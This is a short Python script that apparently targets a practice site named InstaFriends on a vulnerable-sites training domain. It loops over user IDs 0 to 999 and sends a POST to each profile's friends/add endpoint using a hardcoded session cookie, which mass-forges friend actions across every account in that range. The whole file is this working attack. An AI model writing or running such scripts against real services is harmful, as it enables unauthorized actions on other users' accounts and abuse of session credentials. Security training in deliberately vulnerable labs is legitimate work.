import requests

url_head = "https://13-57-228-131-social.vulnerablesites.net:443/InstaFriends/users/profile/"
url_tail = '/friends/add'


for i in range(1000):
    url = url_head + str(i) + url_tail
    cookie = {"instafriends_session_id": "j6yxe/yfuKrtuCxcJbkycsWxG2757g43+8BukIK/LBD/rRaM"}
    requests.post(url, cookies=cookie)
    print('fugg')